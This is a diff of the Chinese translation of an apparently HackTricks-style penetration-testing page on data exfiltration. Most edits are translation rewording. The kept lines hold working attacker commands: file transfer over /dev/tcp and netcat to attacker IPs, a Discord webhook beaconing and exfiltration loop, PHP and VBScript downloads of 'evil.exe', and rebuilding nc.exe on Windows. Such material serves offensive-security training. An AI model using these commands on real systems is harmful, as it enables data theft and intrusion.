@@ -1,12 +1,19 @@
-# Exfiltration
+# 数据外传
 
 {{#include ../banners/hacktricks-training.md}}
 
-## 常见可用于 exfiltrate 信息的白名单域名
+> [!TIP]
+> 有关在 `C:\Users\Public` 暂存 loot 并使用 Rclone exfiltrating 来模拟合法备份的端到端示例，请查看下面的工作流程。
+
+{{#ref}}
+../windows-hardening/windows-local-privilege-escalation/dll-hijacking/advanced-html-staged-dll-sideloading.md
+{{#endref}}
+
+## 常见被列入白名单用于 exfiltrate 信息的域名
 
 查看 [https://lots-project.com/](https://lots-project.com/) 以查找可被滥用的常见白名单域名
 
-## Copy\&Paste Base64
+## 复制\&粘贴 Base64
 
 **Linux**
 ```bash
@@ -100,14 +107,14 @@ if __name__ == "__main__":
 app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ###
 ```
-## Webhooks (Discord/Slack/Teams) 用于 C2 & Data Exfiltration
+## Webhooks (Discord/Slack/Teams) for C2 & Data Exfiltration
 
-Webhooks 是只写的 HTTPS 端点，可接收 JSON 和可选的文件部分。它们通常被允许访问受信任的 SaaS 域名，并且不需要 OAuth/API keys，这使得它们在低摩擦的 beaconing 和 exfiltration 场景中很有用。
+Webhooks 是只写的 HTTPS 端点，接受 JSON 和可选的文件部分。它们通常被允许访问受信任的 SaaS 域名，且不需要 OAuth/API keys，使其适用于低摩擦的 beaconing 和 exfiltration。
 
-要点：
-- 端点：Discord 使用 https://discord.com/api/webhooks/<id>/<token>
-- 使用 POST multipart/form-data，包含名为 payload_json 的部分，其内容为 {"content":"..."}，以及可选的名为 file 的文件部分。
-- Operator 循环模式：periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep。HTTP 204 NoContent/200 OK 确认投递。
+Key ideas:
+- 端点：Discord uses https://discord.com/api/webhooks/<id>/<token>
+- 使用 POST multipart/form-data，包含名为 payload_json 的一部分，内容为 {"content":"..."}，以及可选的名为 file 的文件部分。
+- 操作员循环模式：periodic beacon -> directory recon -> targeted file exfil -> recon dump -> sleep。HTTP 204 NoContent/200 OK 确认送达。
 
 PowerShell PoC (Discord):
 ```powershell
@@ -178,8 +185,8 @@ Start-Sleep -Seconds 20
 }
 ```
 注意：
-- 类似的模式也适用于其他协作平台 (Slack/Teams) 使用它们的 incoming webhooks；相应地调整 URL 和 JSON schema。
-- 有关 Discord Desktop 缓存工件 和 webhook/API recovery 的 DFIR，请参见：
+- 类似的模式适用于其他协作平台 (Slack/Teams) 使用它们的 incoming webhooks；请相应调整 URL 和 JSON schema。
+- 有关 Discord Desktop 缓存工件的 DFIR 以及 webhook/API 恢复，请参见：
 
 {{#ref}}
 ../generic-methodologies-and-resources/basic-forensic-methodology/specific-software-file-type-tricks/discord-cache-forensics.md
@@ -192,7 +199,7 @@ Start-Sleep -Seconds 20
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
 ```
-### FTP server (NodeJS)
+### FTP 服务器 (NodeJS)
 ```
 sudo npm install -g ftp-srv --save
 ftp-srv ftp://0.0.0.0:9876 --root /tmp
@@ -260,13 +267,13 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-攻击者必须运行 SSHd。
+攻击者必须让 SSHd 处于运行状态。
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-如果 victim 有 SSH，attacker 可以把 victim 上的目录 mount 到 attacker 上。
+如果 victim 有 SSH，attacker 可以将 victim 的目录挂载到 attacker 主机上。
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -279,12 +286,12 @@ nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### 从受害主机下载文件
+### 从受害者下载文件
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### 将文件上传到受害者
+### 向受害者上传文件
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
@@ -313,22 +320,22 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-如果你可以将数据发送到 SMTP 服务器，你可以使用 python 创建一个 SMTP 服务器来接收这些数据：
+如果你能向 SMTP 服务器发送数据，你可以用 python 创建一个 SMTP 来接收这些数据：
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-默认在 XP 和 2003 中（在其他系统中需要在安装时显式添加）
+在 XP 和 2003 中默认启用（在其他系统中需要在安装时显式添加）
 
-在 Kali 中，**start TFTP server**:
+在 Kali，**start TFTP server**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
 atftpd --daemon --port 69 /tftp
 cp /path/tp/nc.exe /tftp
 ```
-**用 python 编写的 TFTP 服务器：**
+**TFTP 服务器（使用 python）：**
 ```bash
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
@@ -339,7 +346,7 @@ tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-使用 PHP oneliner 下载文件：
+使用 PHP 单行命令下载文件:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -381,13 +388,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` 程序不仅允许检查二进制文件，还具有 **从 hex 重建它们的能力**。这意味着，通过提供某个二进制的 hex，`debug.exe` 就可以生成该二进制文件。然而，需要注意的是 debug.exe 在组装文件时有 **最大 64 kb 的大小限制**。
+`debug.exe` 程序不仅允许检查二进制文件，还具有 **从 hex 重建它们的能力**。这意味着通过提供某个二进制的 hex，`debug.exe` 可以生成该二进制文件。然而，重要的是要注意 debug.exe 有一个 **只能组装不超过 64 kb 的文件的限制**。
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-然后将文本复制粘贴到 windows-shell 中，名为 nc.exe 的文件会被创建。
+然后将文本复制粘贴到 windows-shell 中，就会创建一个名为 nc.exe 的文件。
 
 - [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
